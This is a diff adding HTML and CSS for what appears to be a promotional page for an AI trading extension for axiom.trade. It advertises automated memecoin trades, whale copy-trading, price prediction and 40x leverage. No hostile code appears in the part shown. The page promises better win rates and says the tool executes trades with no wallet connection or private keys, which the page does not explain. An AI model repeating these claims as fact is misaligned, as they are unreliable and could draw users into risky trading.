+											height="24"
+											viewBox="0 0 24 24"
+											fill="none"
+											xmlns="http://www.w3.org/2000/svg"
+										>
+											<path
+												d="M20 6L9 17L4 12"
+												stroke="white"
+												stroke-width="2"
+												stroke-linecap="round"
+												stroke-linejoin="round"
+											/>
+										</svg>
+									</div>
+									<div class="feature-item-content">
+										<h3 data-translate="features.stealth">
+											Stealth wallet watcher
+										</h3>
+										<p data-translate="features.stealthDesc">
+											Monitor specific wallets for instant alerts
+										</p>
+									</div>
+								</div>
+								<div class="feature-item">
+									<div class="feature-item-icon">
+										<svg
+											width="24"
+											height="24"
+											viewBox="0 0 24 24"
+											fill="none"
+											xmlns="http://www.w3.org/2000/svg"
+										>
+											<path
+												d="M20 6L9 17L4 12"
+												stroke="white"
+												stroke-width="2"
+												stroke-linecap="round"
+												stroke-linejoin="round"
+											/>
+										</svg>
+									</div>
+									<div class="feature-item-content">
+										<h3 data-translate="features.logic">
+											Intuitively construct automatic logic
+										</h3>
+										<p data-translate="features.logicDesc">
+											Create complex strategies with simple visual tools
+										</p>
+									</div>
+								</div>
+								<div class="feature-item">
+									<div class="feature-item-icon">
+										<svg
+											width="24"
+											height="24"
+											viewBox="0 0 24 24"
+											fill="none"
+											xmlns="http://www.w3.org/2000/svg"
+										>
+											<path
+												d="M20 6L9 17L4 12"
+												stroke="white"
+												stroke-width="2"
+												stroke-linecap="round"
+												stroke-linejoin="round"
+											/>
+										</svg>
+									</div>
+									<div class="feature-item-content">
+										<h3 data-translate="features.dashboard">
+											Manage coin and wallet tracking in your dashboard
+										</h3>
+										<p data-translate="features.dashboardDesc">
+											Centralized control panel for all your assets
+										</p>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</section>
+
+			<a href="#" onclick="scrollToAbout(); return false;">About</a>
+			<a href="#" onclick="scrollToWhy(); return false;">Why Ai tool for Axiom</a>
+			<a href="#" onclick="scrollToInstallation(); return false;"
+				>Installation</a
+			>
+			<a href="#" onclick="doNothing(); return false;">X</a>
+			<a href="#" onclick="doNothing(); return false;"></a>
+			<a href="#" onclick="openAxiom(); return false;">axiom.trade</a>
+
+
+			<section id="x" class="section">
+				<div class="container">
+					<div class="section-header">
+						<div class="section-badge">X</div>
+						<h2 class="section-title">Follow us on X</h2>
+						<p class="section-description">
+							Open our profile on X for updates.
+						</p>
+					</div>
+				</div>
+			</section>
+
+			<section id="about" class="section">
+				<div class="container">
+					<div class="section-header" data-aos="fade-up">
+						<div class="section-badge" data-translate="about.badge">About</div>
+						<h2 class="section-title" data-translate="about.title">
+							What is Ai tool for Axiom?
+						</h2>
+						<p class="section-description" data-translate="about.description">
+							A next-generation DeFi intelligence and trading hub built for the
+							axiom.trade platform, designed to keep you in sync with every
+							heartbeat of the market.
+						</p>
+					</div>
+
+					<div class="about-intro-box" data-aos="fade-up" data-aos-delay="100">
+						<p class="about-intro-text" data-translate="about.intro">
+							Ai tool for Axiom is a comprehensive trading enhancement tool designed
+							specifically for axiom.trade. It seamlessly integrates with the
+							platform, adding advanced features and automation capabilities
+							that transform your trading experience without requiring complex
+							setup or wallet connections.
+						</p>
+						<div class="premium-badge" data-translate="about.think">
+							Think of it as a "premium upgrade" for axiom.trade – same platform
+							you love, but with superpowers.
+						</div>
+					</div>
+
+					<h3
+						class="features-main-title"
+						data-aos="fade-up"
+						data-aos-delay="150"
+						data-translate="about.enhancesTitle"
+					>
+						How It Enhances Your Trading
+					</h3>
+
+					<!-- Smart Trade Triggers -->
+					<div
+						class="feature-card expandable"
+						data-aos="fade-up"
+						data-aos-delay="200"
+					>
+						<div class="feature-card-header" onclick="toggleFeature(this)">
+							<div class="feature-icon">
+								<svg
+									width="40"
+									height="40"
+									viewBox="0 0 40 40"
+									fill="none"
+									xmlns="http://www.w3.org/2000/svg"
+								>
+									<rect width="40" height="40" rx="12" fill="url(#gradient1)" />
+									<path
+										d="M20 10L24 14L20 18M20 18L16 14L20 10M20 18V30M28 20H12"
+										stroke="white"
+										stroke-width="2"
+										stroke-linecap="round"
+										stroke-linejoin="round"
+									/>
+									<defs>
+										<linearGradient
+											id="gradient1"
+											x1="0"
+											y1="0"
+											x2="40"
+											y2="40"
+										>
+											<stop stop-color="#10b981" />
+											<stop offset="1" stop-color="#059669" />
+										</linearGradient>
+									</defs>
+								</svg>
+							</div>
+							<div class="feature-header-content">
+								<h4
+									class="feature-title"
+									data-translate="about.smartTriggersTitle"
+								>
+									Smart Trade Triggers
+								</h4>
+								<p
+									class="feature-subtitle"
+									data-translate="about.smartTriggersIntro"
+								>
+									Transform manual trading into automated strategies
+								</p>
+							</div>
+							<div class="expand-icon">
+								<svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+									<path
+										d="M6 9L12 15L18 9"
+										stroke="currentColor"
+										stroke-width="2"
+										stroke-linecap="round"
+									/>
+								</svg>
+							</div>
+						</div>
+						<div class="feature-card-body">
+							<div class="examples-grid">
+								<div class="example-item">
+									<span class="example-number">01</span>
+									<p data-translate="about.example1">
+										"If memecoin X hits $0.001, buy 100 SOL worth"
+									</p>
+								</div>
+								<div class="example-item">
+									<span class="example-number">02</span>
+									<p data-translate="about.example2">
+										"If my position gains 50%, take profit on 30%"
+									</p>
+								</div>
+								<div class="example-item">
+									<span class="example-number">03</span>
+									<p data-translate="about.example3">
+										"If whale wallet Y buys, copy with 10 SOL"
+									</p>
+								</div>
+							</div>
+							<div class="benefit-box">
+								<span class="benefit-label" data-translate="about.benefit"
+									>The benefit:</span
+								>
+								<span data-translate="about.smartTriggersBenefit"
+									>Never miss an opportunity. Trade 24/7, even while you sleep.
+									Make trading more efficient and less stressful.</span
+								>
+							</div>
+						</div>
+					</div>
+
+					<!-- AI-Powered Market Analysis -->
+					<div
+						class="feature-card expandable"
+						data-aos="fade-up"
+						data-aos-delay="250"
+					>
+						<div class="feature-card-header" onclick="toggleFeature(this)">
+							<div class="feature-icon">
+								<svg
+									width="40"
+									height="40"
+									viewBox="0 0 40 40"
+									fill="none"
+									xmlns="http://www.w3.org/2000/svg"
+								>
+									<rect width="40" height="40" rx="12" fill="url(#gradient2)" />
+									<circle
+										cx="20"
+										cy="20"
+										r="8"
+										stroke="white"
+										stroke-width="2"
+									/>
+									<path
+										d="M20 12V20L24 24"
+										stroke="white"
+										stroke-width="2"
+										stroke-linecap="round"
+									/>
+									<path
+										d="M28 20H32M8 20H12M20 8V12M20 28V32"
+										stroke="white"
+										stroke-width="2"
+										stroke-linecap="round"
+									/>
+									<defs>
+										<linearGradient
+											id="gradient2"
+											x1="0"
+											y1="0"
+											x2="40"
+											y2="40"
+										>
+											<stop stop-color="#10b981" />
+											<stop offset="1" stop-color="#047857" />
+										</linearGradient>
+									</defs>
+								</svg>
+							</div>
+							<div class="feature-header-content">
+								<h4 class="feature-title" data-translate="about.aiTitle">
+									AI-Powered Market Analysis
+								</h4>
+								<p class="feature-subtitle" data-translate="about.aiIntro">
+									Enhanced market intelligence right in your axiom.trade
+									interface
+								</p>
+							</div>
+							<div class="expand-icon">
+								<svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+									<path
+										d="M6 9L12 15L18 9"
+										stroke="currentColor"
+										stroke-width="2"
+										stroke-linecap="round"
+									/>
+								</svg>
+							</div>
+						</div>
+						<div class="feature-card-body">
+							<div class="features-list">
+								<div class="feature-list-item">
+									<div class="checkmark">✓</div>
+									<span data-translate="about.aiFeature1"
+										>Optimal entry/exit point detection</span
+									>
+								</div>
+								<div class="feature-list-item">
+									<div class="checkmark">✓</div>
+									<span data-translate="about.aiFeature2"
+										>Market sentiment analysis</span
+									>
+								</div>
+								<div class="feature-list-item">
+									<div class="checkmark">✓</div>
+									<span data-translate="about.aiFeature3"
+										>Price movement prediction</span
+									>
+								</div>
+								<div class="feature-list-item">
+									<div class="checkmark">✓</div>
+									<span data-translate="about.aiFeature4"
+										>Risk assessment in real-time</span
+									>
+								</div>
+							</div>
+							<div class="benefit-box">
+								<span class="benefit-label" data-translate="about.benefit"
+									>The benefit:</span
+								>
+								<span data-translate="about.aiBenefit"
+									>Make smarter decisions faster. Reduce emotional trading.
+									Increase win rates with data-driven insights.</span
+								>
+							</div>
+						</div>
+					</div>
+
+					<!-- Whale Wallet Tracking -->
+					<div
+						class="feature-card expandable"
+						data-aos="fade-up"
+						data-aos-delay="300"
+					>
+						<div class="feature-card-header" onclick="toggleFeature(this)">
+							<div class="feature-icon">
+								<svg
+									width="40"
+									height="40"
+									viewBox="0 0 40 40"
+									fill="none"
+									xmlns="http://www.w3.org/2000/svg"
+								>
+									<rect width="40" height="40" rx="12" fill="url(#gradient3)" />
+									<path
+										d="M12 24C12 24 14 22 20 22C26 22 28 24 28 24M20 12V18M16 16L20 12L24 16"
+										stroke="white"
+										stroke-width="2"
+										stroke-linecap="round"
+										stroke-linejoin="round"
+									/>
+									<circle cx="20" cy="26" r="2" fill="white" />
+									<defs>
+										<linearGradient
+											id="gradient3"
+											x1="0"
+											y1="0"
+											x2="40"
+											y2="40"
+										>
+											<stop stop-color="#059669" />
+											<stop offset="1" stop-color="#047857" />
+										</linearGradient>
+									</defs>
+								</svg>
+							</div>
+							<div class="feature-header-content">
+								<h4 class="feature-title" data-translate="about.whaleTitle">
+									Whale Wallet Tracking
+								</h4>
+								<p class="feature-subtitle" data-translate="about.whaleIntro">
+									Follow the smart money effortlessly
+								</p>
+							</div>
+							<div class="expand-icon">
+								<svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+									<path
+										d="M6 9L12 15L18 9"
+										stroke="currentColor"
+										stroke-width="2"
+										stroke-linecap="round"
+									/>
+								</svg>
+							</div>
+						</div>
+						<div class="feature-card-body">
+							<div class="features-list">
+								<div class="feature-list-item">
+									<div class="checkmark">✓</div>
+									<span data-translate="about.whaleFeature1"
+										>Track successful traders automatically</span
+									>
+								</div>
+								<div class="feature-list-item">
+									<div class="checkmark">✓</div>
+									<span data-translate="about.whaleFeature2"
+										>Copy their entries and exits</span
+									>
+								</div>
+								<div class="feature-list-item">
+									<div class="checkmark">✓</div>
+									<span data-translate="about.whaleFeature3"
+										>Customize position sizing</span
+									>
+								</div>
+								<div class="feature-list-item">
+									<div class="checkmark">✓</div>
+									<span data-translate="about.whaleFeature4"
+										>Set your own risk parameters</span
+									>
+								</div>
+							</div>
+							<div class="benefit-box">
+								<span class="benefit-label" data-translate="about.benefit"
+									>The benefit:</span
+								>
+								<span data-translate="about.whaleBenefit"
+									>Learn from the best. Piggyback on proven strategies. Improve
+									your trading by following successful patterns.</span
+								>
+							</div>
+						</div>
+					</div>
+
+					<!-- Enhanced Multichain Monitoring -->
+					<div
+						class="feature-card expandable"
+						data-aos="fade-up"
+						data-aos-delay="350"
+					>
+						<div class="feature-card-header" onclick="toggleFeature(this)">
+							<div class="feature-icon">
+								<svg
+									width="40"
+									height="40"
+									viewBox="0 0 40 40"
+									fill="none"
+									xmlns="http://www.w3.org/2000/svg"
+								>
+									<rect width="40" height="40" rx="12" fill="url(#gradient4)" />
+									<rect
+										x="10"
+										y="10"
+										width="8"
+										height="8"
+										rx="2"
+										stroke="white"
+										stroke-width="2"
+									/>
+									<rect
+										x="22"
+										y="10"
+										width="8"
+										height="8"
+										rx="2"
+										stroke="white"
+										stroke-width="2"
+									/>
+									<rect
+										x="10"
+										y="22"
+										width="8"
+										height="8"
+										rx="2"
+										stroke="white"
+										stroke-width="2"
+									/>
+									<rect
+										x="22"
+										y="22"
+										width="8"
+										height="8"
+										rx="2"
+										stroke="white"
+										stroke-width="2"
+									/>
+									<defs>
+										<linearGradient
+											id="gradient4"
+											x1="0"
+											y1="0"
+											x2="40"
+											y2="40"
+										>
+											<stop stop-color="#10b981" />
+											<stop offset="1" stop-color="#065f46" />
+										</linearGradient>
+									</defs>
+								</svg>
+							</div>
+							<div class="feature-header-content">
+								<h4
+									class="feature-title"
+									data-translate="about.multichainTitle"
+								>
+									Enhanced Multichain Monitoring
+								</h4>
+								<p
+									class="feature-subtitle"
+									data-translate="about.multichainIntro"
+								>
+									Every memecoin. Every network. Better visibility
+								</p>
+							</div>
+							<div class="expand-icon">
+								<svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+									<path
+										d="M6 9L12 15L18 9"
+										stroke="currentColor"
+										stroke-width="2"
+										stroke-linecap="round"
+									/>
+								</svg>
+							</div>
+						</div>
+						<div class="feature-card-body">
+							<div class="features-list">
+								<div class="feature-list-item">
+									<div class="checkmark">✓</div>
+									<span data-translate="about.multichainFeature1"
+										>Real-time tracking across all major chains</span
+									>
+								</div>
+								<div class="feature-list-item">
+									<div class="checkmark">✓</div>
+									<span data-translate="about.multichainFeature2"
+										>Instant alerts on new launches</span
+									>
+								</div>
+								<div class="feature-list-item">
+									<div class="checkmark">✓</div>
+									<span data-translate="about.multichainFeature3"
+										>Volume and liquidity analysis</span
+									>
+								</div>
+								<div class="feature-list-item">
+									<div class="checkmark">✓</div>
+									<span data-translate="about.multichainFeature4"
+										>Historical performance data</span
+									>
+								</div>
+							</div>
+							<div class="benefit-box">
+								<span class="benefit-label" data-translate="about.benefit"
+									>The benefit:</span
+								>
+								<span data-translate="about.multichainBenefit"
+									>Stay ahead of the market. Spot opportunities before others.
+									Make informed decisions with comprehensive data.</span
+								>
+							</div>
+						</div>
+					</div>
+
+					<!-- Improved Trading Interface -->
+					<div
+						class="feature-card expandable"
+						data-aos="fade-up"
+						data-aos-delay="400"
+					>
+						<div class="feature-card-header" onclick="toggleFeature(this)">
+							<div class="feature-icon">
+								<svg
+									width="40"
+									height="40"
+									viewBox="0 0 40 40"
+									fill="none"
+									xmlns="http://www.w3.org/2000/svg"
+								>
+									<rect width="40" height="40" rx="12" fill="url(#gradient5)" />
+									<path
+										d="M12 20L16 16L20 20L28 12M28 12H24M28 12V16"
+										stroke="white"
+										stroke-width="2"
+										stroke-linecap="round"
+										stroke-linejoin="round"
+									/>
+									<path
+										d="M10 28H30"
+										stroke="white"
+										stroke-width="2"
+										stroke-linecap="round"
+									/>
+									<defs>
+										<linearGradient
+											id="gradient5"
+											x1="0"
+											y1="0"
+											x2="40"
+											y2="40"
+										>
+											<stop stop-color="#059669" />
+											<stop offset="1" stop-color="#10b981" />
+										</linearGradient>
+									</defs>
+								</svg>
+							</div>
+							<div class="feature-header-content">
+								<h4 class="feature-title" data-translate="about.interfaceTitle">
+									Improved Trading Interface
+								</h4>
+								<p
+									class="feature-subtitle"
+									data-translate="about.interfaceIntro"
+								>
+									Work with 40x leverage more effectively
+								</p>
+							</div>
+							<div class="expand-icon">
+								<svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+									<path
+										d="M6 9L12 15L18 9"
+										stroke="currentColor"
+										stroke-width="2"
+										stroke-linecap="round"
+									/>
+								</svg>
+							</div>
+						</div>
+						<div class="feature-card-body">
+							<div class="features-list">
+								<div class="feature-list-item">
+									<div class="checkmark">✓</div>
+									<span data-translate="about.interfaceFeature1"
+										>Better position management</span
+									>
+								</div>
+								<div class="feature-list-item">
+									<div class="checkmark">✓</div>
+									<span data-translate="about.interfaceFeature2"
+										>Advanced order types</span
+									>
+								</div>
+								<div class="feature-list-item">
+									<div class="checkmark">✓</div>
+									<span data-translate="about.interfaceFeature3"
+										>Quick execution tools</span
+									>
+								</div>
+								<div class="feature-list-item">
+									<div class="checkmark">✓</div>
+									<span data-translate="about.interfaceFeature4"
+										>Enhanced risk controls</span
+									>
+								</div>
+							</div>
+							<div class="benefit-box">
+								<span class="benefit-label" data-translate="about.benefit"
+									>The benefit:</span
+								>
+								<span data-translate="about.interfaceBenefit"
+									>Trade with confidence. Execute faster. Manage risk better.
+									Make trading more convenient.</span
+								>
+							</div>
+						</div>
+					</div>
+
+					<!-- Why Better Section -->
+					<div
+						class="why-better-section"
+						data-aos="fade-up"
+						data-aos-delay="450"
+					>
+						<h3
+							class="features-main-title"
+							data-translate="about.whyBetterTitle"
+						>
+							Why This Extension Makes Trading Better
+						</h3>
+
+						<div class="why-better-grid">
+							<div class="why-better-card">
+								<div class="why-icon">
+									<svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+										<rect
+											width="32"
+											height="32"
+											rx="8"
+											fill="rgba(16, 185, 129, 0.1)"
+										/>
+										<path
+											d="M16 8V24M12 12L16 8L20 12M12 20L16 24L20 20"
+											stroke="#10b981"
+											stroke-width="2"
+											stroke-linecap="round"
+											stroke-linejoin="round"
+										/>
+									</svg>
+								</div>
+								<h4 data-translate="about.enhancedFunc">
+									Enhanced Functionality
+								</h4>
+								<p data-translate="about.enhancedFuncText">
+									Ai tool for Axiom doesn't replace axiom.trade – it makes it better.
+									All your favorite features remain, plus powerful additions
+									that professional traders demand.
+								</p>
+							</div>
+
+							<div class="why-better-card">
+								<div class="why-icon">
+									<svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+										<rect
+											width="32"
+											height="32"
+											rx="8"
+											fill="rgba(16, 185, 129, 0.1)"
+										/>
+										<circle
+											cx="16"
+											cy="16"
+											r="6"
+											stroke="#10b981"
+											stroke-width="2"
+										/>
+										<path
+											d="M16 10V16L20 18"
+											stroke="#10b981"
+											stroke-width="2"
+											stroke-linecap="round"
+										/>
+									</svg>
+								</div>
+								<h4 data-translate="about.easierUse">Easier to Use</h4>
+								<p data-translate="about.easierUseText">
+									Complex strategies become simple. Automation removes
+									repetitive tasks. Better interface makes navigation smoother.
+								</p>
+							</div>
+
+							<div class="why-better-card">
+								<div class="why-icon">
+									<svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+										<rect
+											width="32"
+											height="32"
+											rx="8"
+											fill="rgba(16, 185, 129, 0.1)"
+										/>
+										<path
+											d="M8 20L12 16L16 20L24 12M24 12H20M24 12V16"
+											stroke="#10b981"
+											stroke-width="2"
+											stroke-linecap="round"
+											stroke-linejoin="round"
+										/>
+									</svg>
+								</div>
+								<h4 data-translate="about.moreEfficient">More Efficient</h4>
+								<p data-translate="about.moreEfficientText">
+									Execute trades faster. Monitor more markets simultaneously.
+									React to opportunities in milliseconds, not minutes.
+								</p>
+							</div>
+
+							<div class="why-better-card">
+								<div class="why-icon">
+									<svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+										<rect
+											width="32"
+											height="32"
+											rx="8"
+											fill="rgba(16, 185, 129, 0.1)"
+										/>
+										<path
+											d="M16 8C11.6 8 8 11.6 8 16C8 20.4 11.6 24 16 24C20.4 24 24 20.4 24 16C24 11.6 20.4 8 16 8Z"
+											stroke="#10b981"
+											stroke-width="2"
+										/>
+										<path
+											d="M16 12V16L19 19"
+											stroke="#10b981"
+											stroke-width="2"
+											stroke-linecap="round"
+										/>
+									</svg>
+								</div>
+								<h4 data-translate="about.stillSecure">Still Secure</h4>
+								<div class="security-features">
+									<span data-translate="about.secureFeature1"
+										>✓ No wallet connection</span
+									>
+									<span data-translate="about.secureFeature2"
+										>✓ No private keys</span
+									>
+									<span data-translate="about.secureFeature3"
+										>✓ No custody</span
+									>
+								</div>
+							</div>
+						</div>
+					</div>
+
+					<!-- Final CTA -->
+					<div class="about-cta" data-aos="fade-up" data-aos-delay="500">
+						<p class="about-final-text" data-translate="about.text2">
+							Whether you're a pro trader, data analyst, or DeFi builder,
+							Ai tool for Axiom gives you the tools to act faster, smarter, and ahead
+							of the curve - all without leaving the axiom.trade ecosystem.
+						</p>
+						<p class="about-footnote" data-translate="about.footnote">
+							Built to support all kinds of trading strategies and integrated
+							with axiom.trade
+						</p>
+					</div>
+				</div>
+			</section>
+
+			<style>
+				/* About Section Styles */
+				.about-intro-box {
+					background: rgba(255, 255, 255, 0.03);
+					border: 1px solid var(--border-color);
+					border-radius: 20px;
+					padding: 2.5rem;
+					margin-bottom: 3rem;
+					position: relative;
+					overflow: hidden;
+				}
+
+				.about-intro-box::before {
+					content: '';
+					position: absolute;
+					top: 0;
+					left: 0;
+					right: 0;
+					height: 3px;
+					background: linear-gradient(
+						90deg,
+						var(--primary),
+						#059669,
+						var(--primary)
+					);
+					background-size: 200% 100%;
+					animation: shimmer 3s infinite;
+				}
+
+				@keyframes shimmer {
+					0%,
+					100% {
+						background-position: 0% 50%;
+					}
+					50% {
+						background-position: 100% 50%;
+					}
+				}
+
+				.about-intro-text {
+					font-size: 1.1rem;
+					line-height: 1.8;
+					color: var(--text-secondary);
+					margin-bottom: 1.5rem;
+				}
+
+				.premium-badge {
+					display: inline-block;
+					padding: 1rem 2rem;
+					background: linear-gradient(
+						135deg,
+						rgba(16, 185, 129, 0.1) 0%,
+						rgba(5, 150, 105, 0.1) 100%
+					);
+					border: 1px solid var(--primary);
+					border-radius: 12px;
+					color: var(--primary);
+					font-size: 1.1rem;
+					font-weight: 600;
+					position: relative;
+					overflow: hidden;
+				}
+
+				.features-main-title {
+					font-size: 2rem;
+					font-weight: 700;
+					text-align: center;
+					margin: 3rem 0 2rem;
+					background: linear-gradient(135deg, #ffffff 0%, var(--primary) 100%);
+					-webkit-background-clip: text;
+					-webkit-text-fill-color: transparent;
+					background-clip: text;
+				}
+
+				.feature-card {
+					background: rgba(255, 255, 255, 0.03);
+					border: 1px solid var(--border-color);
+					border-radius: 16px;
+					margin-bottom: 1.5rem;
+					overflow: hidden;
+					transition: all 0.3s ease;
+				}
+
+				.feature-card:hover {
+					border-color: var(--primary);
+					transform: translateY(-2px);
+					box-shadow: 0 8px 24px rgba(16, 185, 129, 0.1);
+				}
+
+				.feature-card-header {
+					display: flex;
+					align-items: center;
+					gap: 1.5rem;
+					padding: 1.5rem 2rem;
+					cursor: pointer;
+					transition: background 0.3s ease;
+				}
+
+				.feature-card-header:hover {
+					background: rgba(16, 185, 129, 0.05);
+				}
+
+				.feature-icon {
+					flex-shrink: 0;
+				}
+
+				.feature-header-content {
+					flex: 1;
+				}
+
+				.feature-title {
+					font-size: 1.3rem;
+					font-weight: 600;
+					color: var(--text-primary);
+					margin-bottom: 0.3rem;
+				}
+
+				.feature-subtitle {
+					font-size: 0.95rem;
+					color: var(--text-secondary);
+					margin: 0;
+				}
+
+				.expand-icon {
+					color: var(--primary);
+					transition: transform 0.3s ease;
+				}
+
+				.feature-card.expanded .expand-icon {
+					transform: rotate(180deg);
+				}
+
+				.feature-card-body {
+					max-height: 0;
+					overflow: hidden;
+					transition: max-height 0.4s ease, padding 0.4s ease;
+					padding: 0 2rem;
+				}
+
+				.feature-card.expanded .feature-card-body {
+					max-height: 1000px;
+					padding: 0 2rem 2rem;
+				}
+
+				.examples-grid {
+					display: grid;
+					gap: 1rem;
+					margin-bottom: 1.5rem;
+				}
+
+				.example-item {
+					display: flex;
+					gap: 1rem;
+					align-items: flex-start;
+					padding: 1rem;
+					background: rgba(16, 185, 129, 0.05);
+					border-left: 3px solid var(--primary);
+					border-radius: 8px;
+				}
+
+				.example-number {
+					font-size: 1.2rem;
+					font-weight: 700;
+					color: var(--primary);
+					flex-shrink: 0;
+				}
+
+				.example-item p {
+					margin: 0;
+					color: var(--text-secondary);
+					line-height: 1.6;
+				}
+
+				.features-list {
+					display: grid;
+					gap: 0.8rem;
+					margin-bottom: 1.5rem;
+				}
+
+				.feature-list-item {
+					display: flex;
+					align-items: center;
+					gap: 1rem;
+					padding: 0.8rem;
+					background: rgba(255, 255, 255, 0.02);
+					border-radius: 8px;
+					transition: all 0.3s ease;
+				}
+
+				.feature-list-item:hover {
+					background: rgba(16, 185, 129, 0.05);
+					transform: translateX(5px);
+				}
+
+				.checkmark {
+					width: 24px;
+					height: 24px;
+					border-radius: 50%;
+					background: var(--primary);
+					color: white;
+					display: flex;
+					align-items: center;
+					justify-content: center;
+					flex-shrink: 0;
+					font-weight: 700;
+				}
+
+				.feature-list-item span {
+					color: var(--text-secondary);
+				}
+
+				.benefit-box {
+					padding: 1.5rem;
+					background: linear-gradient(
+						135deg,
+						rgba(16, 185, 129, 0.1) 0%,
+						rgba(5, 150, 105, 0.05) 100%
+					);
+					border: 1px solid rgba(16, 185, 129, 0.3);
+					border-radius: 12px;
+					display: flex;
+					gap: 0.5rem;
+					flex-wrap: wrap;
+				}
+
+				.benefit-label {
+					font-weight: 700;
+					color: var(--primary);
+				}
+
+				.benefit-box span:last-child {
+					color: var(--text-primary);
+					flex: 1;
+				}
+
+				.why-better-section {
+					margin-top: 4rem;
+				}
+
+				.why-better-grid {
+					display: grid;
+					grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+					gap: 1.5rem;
+					margin-top: 2rem;
+				}
+
+				.why-better-card {
+					padding: 2rem;
+					background: rgba(255, 255, 255, 0.03);
+					border: 1px solid var(--border-color);
+					border-radius: 16px;
+					transition: all 0.3s ease;
+				}
+
+				.why-better-card:hover {
+					border-color: var(--primary);
+					transform: translateY(-5px);
+					box-shadow: 0 12px 32px rgba(16, 185, 129, 0.15);
+				}
+
+				.why-icon {
+					margin-bottom: 1rem;
+				}
+
+				.why-better-card h4 {
+					font-size: 1.2rem;
+					font-weight: 600;
+					color: var(--text-primary);
+					margin-bottom: 0.8rem;
+				}
+
+				.why-better-card p {
+					color: var(--text-secondary);
+					line-height: 1.7;
+					margin: 0;
+				}
+
+				.security-features {
+					display: flex;
+					flex-direction: column;
+					gap: 0.5rem;
+					margin-top: 0.8rem;
+				}
+
+				.security-features span {
+					color: var(--text-secondary);
+					font-size: 0.9rem;
+				}
+
+				.about-cta {
+					text-align: center;
+					margin-top: 4rem;
+					padding: 3rem 2rem;
+					background: linear-gradient(
+						135deg,
+						rgba(16, 185, 129, 0.05) 0%,
+						rgba(5, 150, 105, 0.05) 100%
+					);
+					border-radius: 20px;
+					border: 1px solid rgba(16, 185, 129, 0.2);
+					position: relative;
+					overflow: hidden;
+				}
+
+				.about-cta::before {
+					content: '';
+					position: absolute;
+					top: -50%;
+					left: -50%;
+					width: 200%;
+					height: 200%;
+					background: radial-gradient(
+						circle,
+						rgba(16, 185, 129, 0.1) 0%,
+						transparent 70%
+					);
+					animation: rotate 20s linear infinite;
+				}
+
+				@keyframes rotate {
+					from {
+						transform: rotate(0deg);
+					}
+					to {
+						transform: rotate(360deg);
+					}
+				}
+
+				.about-final-text {
+					font-size: 1.2rem;
+					line-height: 1.8;
+					color: var(--text-primary);
+					max-width: 900px;
+					margin: 0 auto 1.5rem;
+					position: relative;
+					z-index: 1;
+				}
+
+				.about-footnote {
+					font-size: 0.95rem;
+					color: var(--text-secondary);
+					font-style: italic;
+					position: relative;
+					z-index: 1;
+				}
+
+				@media (max-width: 768px) {
+					.about-intro-box {
+						padding: 1.5rem;
+					}
+
+					.feature-card-header {
+						padding: 1rem 1.5rem;
+						gap: 1rem;
+					}
+
+					.feature-icon svg {
+						width: 32px;
+						height: 32px;
+					}
+
+					.feature-title {
+						font-size: 1.1rem;
+					}
+
+					.feature-card-body {
+						padding: 0 1.5rem;
+					}
+
+					.feature-card.expanded .feature-card-body {
+						padding: 0 1.5rem 1.5rem;
+					}
+
+					.why-better-grid {
+						grid-template-columns: 1fr;
+					}
+
+					.about-final-text {
+						font-size: 1.1rem;
+					}
+				}
+
+				.-logo-container {
+					margin-left: 32rem;
+				}
+
+				.-logo {
+					height: 300px;
+					filter: brightness(0.8);
+					transition: filter 0.3s;
+				}
+
+				@media (max-width: 1200px) {
+					.-logo-container {
+						margin-left: 0;
+						text-align: center;
+						margin-top: 2rem;
+					}
+				}
+
+				@media (max-width: 768px) {
+					.-logo {
+						height: 150px;
+						max-width: 100%;
+					}
+
+					.-logo-container {
+						margin-left: 0;
+						text-align: center;
+					}
+				}
+			</style>
+
+			<script>
+				function toggleFeature(header) {
+					const card = header.closest('.feature-card');
+					const allCards = document.querySelectorAll('.feature-card');
+
+					// Close other cards
+					allCards.forEach(c => {
+						if (c !== card) {
+							c.classList.remove('expanded');
+						}
+					});
+
+					// Toggle current card
+					card.classList.toggle('expanded');
+				}
+
+				// Auto-expand first card on load
+				document.addEventListener('DOMContentLoaded', function () {
+					const firstCard = document.querySelector('.feature-card');
+					if (firstCard) {
+						firstCard.classList.add('expanded');
+					}
+				});
+			</script>
+			<section id="features" class="section">
+				<div class="container">
+					<div class="section-header" data-aos="fade-up">
+						<div class="section-badge" data-translate="smartTrading.badge">
+							Smart Trading
+						</div>
+						<h2 class="section-title" data-translate="smartTrading.title">
+							Smart Trade Triggers
+						</h2>
+						<p
+							class="section-description"
+							data-translate="smartTrading.description"
+						>
+							Create advanced trade automation using if-this-then-that logic
+							(price, volume, wallet activity, etc.) – no coding required.
+							Enables reactive strategies like sniping, panic-exit failsafes, or
+							whale-copying without manual execution.
+						</p>
+					</div>
+
+					<div class="two-column" style="margin-top: 4rem">
+						<div
+							data-aos="fade-right"
+							style="display: flex; align-items: center"
+						>
+							<div>
+								<h3
+									style="font-size: 2rem; margin-bottom: 1.5rem"
+									data-translate="smartTrading.sideTitle"
+								>
+									Automate your winning strategies
+								</h3>
+								<p
+									style="
+										font-size: 1.1rem;
+										color: var(--text-secondary);
+										line-height: 1.8;
+										margin-bottom: 1.5rem;
+									"
+									data-translate="smartTrading.sideText"
+								>
+									Build complex trading logic without writing a single line of
+									code. Set conditions based on price movements, trading volume,
+									whale wallet activity, and more. Your strategies execute
+									automatically, 24/7.
+								</p>
+							</div>
+						</div>
+
+						<div data-aos="fade-left">
+							<div class="triggers-panel">
+								<div class="triggers-header">
+									<div>
+										<h3
+											style="font-size: 1.3rem; margin-bottom: 0.5rem"
+											data-translate="smartTrading.panelTitle"
+										>
+											Smart Automatic Trade Triggers
+										</h3>
+										<p
+											style="font-size: 0.85rem; color: var(--text-secondary)"
+											data-translate="smartTrading.lastUpdated"
+										>
+											Last updated: 35 min ago
+										</p>
+									</div>
+									<div style="text-align: right">
+										<p
+											style="
+												font-size: 0.85rem;
+												color: var(--text-secondary);
+												margin-bottom: 0.25rem;
+											"
+											data-translate="smartTrading.thisWeek"
+										>
+											This Week
+										</p>
+										<p
